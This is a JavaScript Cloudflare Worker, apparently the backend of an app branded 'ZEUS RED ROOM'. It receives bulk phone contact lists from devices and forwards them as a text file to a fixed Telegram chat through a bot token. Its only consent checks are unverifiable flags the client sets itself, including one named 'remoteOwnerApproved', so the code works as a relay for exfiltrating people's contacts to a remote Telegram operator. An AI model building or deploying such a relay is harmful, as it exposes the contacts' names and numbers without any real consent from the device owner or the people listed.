export default {
  async fetch(request, env) {
    const cors = {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "POST, GET, OPTIONS",
      "Access-Control-Allow-Headers": "Authorization, Content-Type, X-Idempotency-Key",
      "Cache-Control": "no-store"
    };
    if (request.method === "OPTIONS") return new Response(null, { headers: cors });
    const url = new URL(request.url);
    if (url.pathname === "/health" && request.method === "GET")
      return Response.json({ ok: true, service: "ZEUS direct Telegram relay", database: false }, { headers: cors });
    if (url.pathname !== "/v1/backup" || request.method !== "POST")
      return Response.json({ error: "not_found" }, { status: 404, headers: cors });

    const auth = request.headers.get("Authorization") || "";
    if (!env.DEVICE_API_KEY || auth !== "Bearer " + env.DEVICE_API_KEY)
      return Response.json({ error: "unauthorized" }, { status: 401, headers: cors });

    const operationId = request.headers.get("X-Idempotency-Key") || "";
    if (!/^[a-f0-9-]{36}$/i.test(operationId))
      return Response.json({ error: "invalid_operation_id" }, { status: 400, headers: cors });

    let payload;
    try { payload = await request.json(); }
    catch { return Response.json({ error: "invalid_json" }, { status: 400, headers: cors }); }

    if (payload?.consentVersion !== 1 || payload?.remoteOwnerApproved !== true ||
        !Array.isArray(payload?.contacts) || payload.contacts.length < 1 ||
        payload.contacts.length > 5000 || typeof payload.deviceName !== "string" ||
        payload.deviceName.length > 120) {
      return Response.json({ error: "invalid_or_unconsented_payload" }, { status: 400, headers: cors });
    }
    const contacts = payload.contacts.map(c => ({
      name: String(c?.name || "").slice(0, 200),
      phone: String(c?.phone || "").slice(0, 80)
    })).filter(c => c.name || c.phone);
    if (!contacts.length) return Response.json({ error: "empty_contacts" }, { status: 400, headers: cors });

    const text = [
      "ZEUS RED ROOM — User-confirmed contact export",
      "Device: " + payload.deviceName,
      "Selected contacts: " + contacts.length,
      "Operation: " + operationId,
      "Time: " + new Date().toISOString(),
      "",
      ...contacts.flatMap((c, i) => [String(i + 1).padStart(2, "0") + ". " + (c.name || "Unnamed"), c.phone, ""])
    ].join("\n");
    if (new TextEncoder().encode(text).length > 4_500_000)
      return Response.json({ error: "payload_too_large" }, { status: 413, headers: cors });
    if (!env.TELEGRAM_BOT_TOKEN || !env.TELEGRAM_CHAT_ID)
      return Response.json({ ok: false, state: "failed", retry: false, error: "telegram_not_configured" },
        { status: 503, headers: cors });

    const form = new FormData();
    form.set("chat_id", env.TELEGRAM_CHAT_ID);
    form.set("caption", "ZEUS • user-confirmed export • " + contacts.length + " contacts");
    form.set("document", new Blob([text], { type: "text/plain; charset=utf-8" }),
      "ZEUS-" + operationId + ".txt");

    let telegramResponse;
    try {
      telegramResponse = await fetch("https://api.telegram.org/bot" + env.TELEGRAM_BOT_TOKEN + "/sendDocument", {
        method: "POST", body: form
      });
    } catch {
      // Telegram may have accepted the request before the connection failed.
      // Never retry an ambiguous result automatically without an idempotency database.
      return Response.json({ ok: false, state: "unknown", retry: false }, { status: 502, headers: cors });
    }

    let result;
    try { result = await telegramResponse.json(); }
    catch {
      return Response.json({ ok: false, state: "unknown", retry: false }, { status: 502, headers: cors });
    }
    if (!telegramResponse.ok || !result?.ok) {
      // Telegram explicitly rejected the operation; the client may safely retry selected transient failures.
      const retry = telegramResponse.status === 429 || telegramResponse.status >= 500;
      return Response.json({ ok: false, state: "failed", retry, error: "telegram_rejected" },
        { status: 502, headers: cors });
    }
    return Response.json({
      ok: true, state: "delivered", count: contacts.length,
      telegramMessageId: result.result?.message_id || null
    }, { headers: cors });
  }
};
